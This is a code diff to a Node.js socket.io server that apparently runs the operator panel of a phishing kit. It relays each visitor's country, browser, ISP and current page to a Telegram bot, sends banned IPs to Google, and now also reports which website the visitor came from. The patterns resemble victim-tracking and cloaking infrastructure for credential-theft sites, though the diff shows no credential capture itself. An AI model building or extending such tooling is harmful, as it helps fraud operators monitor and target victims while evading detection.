@@ -11,7 +11,6 @@ const { sendTelegramMessage } = require('./bot/telegram');
 const TelegramBot = require('node-telegram-bot-api');
 const axios = require('axios');
 const fs = require('fs');
-const geoip = require('geoip-lite');
 
 const app = express();
 const server = http.createServer(app);
@@ -124,6 +123,26 @@ function formatDateTime(date) {
   };
 }
 
+/** Best-effort page URL: client query (pageUrl/origin), then Origin / Referer headers */
+function siteFromSocket(socket) {
+  const q = socket.handshake.query || {};
+  for (const key of ['pageUrl', 'origin', 'referrer']) {
+    const raw = q[key];
+    if (typeof raw === 'string' && raw.trim()) {
+      try {
+        return decodeURIComponent(raw.trim());
+      } catch {
+        return raw.trim();
+      }
+    }
+  }
+  const origin = socket.handshake.headers.origin;
+  if (origin && typeof origin === 'string') return origin;
+  const referer = socket.handshake.headers.referer;
+  if (referer && typeof referer === 'string') return referer;
+  return 'Unknown';
+}
+
 function updatePanelUsers() {
   const data = Object.values(userData)
     .filter(user => user?.time?.timestamp && Date.now() - user.time.timestamp <= 2 * 60 * 60 * 1000)
@@ -141,15 +160,8 @@ io.on('connection', async (socket) => {
 const userAgent = socket.handshake.headers['user-agent'];
 const timestamp = formatDateTime(new Date());
 
-// Get geolocation info
-const geo = geoip.lookup(clientIP);
-const isEuropean =
-  geo &&
-  geo.country &&
-  ['AL','AD','AT','BE','BA','BG','BY','CH','CY','CZ','DE','DK','EE','ES','FI','FR','GB','GR','HR','HU','IE','IS','IT','LT','LU','LV','MC','MD','ME','MK','MT','NL','NO','PL','PT','RO','RS','RU','SE','SI','SK','SM','UA','VA'].includes(geo.country);
-
-// Redirect banned IPs or EU users
-if (isBanned(clientIP) || isEuropean) {
+// Redirect only banned IPs (EU geo-blocking removed — it sent all EU visitors to Google)
+if (isBanned(clientIP)) {
   socket.emit('redirect', 'https://www.google.com/');
   socket.disconnect();
   return;
@@ -201,6 +213,7 @@ if (isBanned(clientIP) || isEuropean) {
       if (isNewUser) {
         newUsers.add(clientId);
 
+        const website = siteFromSocket(socket);
         const msg =
           `🌟 *New Connection Established*\n\n` +
           `🆔 *Client ID:* \`${clientId}\`\n` +
@@ -209,7 +222,8 @@ if (isBanned(clientIP) || isEuropean) {
           `🏳️ *Country:* \`${country}\`\n` +
           `🌐 *Browser:* \`${browserName}\`\n` +
           `🛣 *Provider:* \`${isp}\`\n\n` +
-          `🕒 *Time:* \`${timestamp.time}\` on \`${timestamp.date}\``;
+          `🕒 *Time:* \`${timestamp.time}\` on \`${timestamp.date}\`\n` +
+          `🔗 *Website:* ${website}`;
 
         sendTelegramMessage(msg, clientId, 'banOnly');
       }
@@ -240,9 +254,11 @@ if (isBanned(clientIP) || isEuropean) {
       userData[cid].action = data.page;
     }
 
+    const siteHint = data.pageUrl || siteFromSocket(socket);
     const pageMsg = `🌐 *User Connected to Page*\n\n` +
       `📄 *Page:* \`${data.page}\`\n` +
-      `📱 *cid:* \`${cid}\``;
+      `📱 *cid:* \`${cid}\`\n` +
+      `🔗 *Website:* ${siteHint}`;
 
     sendTelegramMessage(pageMsg, cid, false);
     updatePanelUsers();
